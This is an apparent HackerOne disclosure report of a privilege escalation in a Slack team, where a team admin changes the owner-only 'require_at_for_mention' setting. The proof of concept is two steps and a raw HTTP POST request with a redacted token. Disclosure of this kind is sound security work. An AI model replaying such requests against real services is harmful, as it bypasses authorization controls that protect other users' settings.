# HackerOne Report: Team admin can change unauthorized team setting (require_at_for_mention)
**Report ID:** 46747
**Vulnerability Class:** Privilege Escalation

## Vulnerability Information & PoC
Team admin can escalate his privileges and change 'require_at_for_mention' team setting, which can be changed only by a team owner.

Steps to reproduce:
1. Log in as team admin
2. Send the below request using his token and notice that it changes 'require_at_for_mention' setting to true.  

POST /api/team.prefs.set?t=1423143830 HTTP/1.1
Host: satishb3mailinator.slack.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://satishb3mailinator.slack.com/admin/settings
Content-Length: 130
Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=...

prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=xoxs-xxxxx&set_active=true&_attempts=1

## Discussion & Remediation Timeline
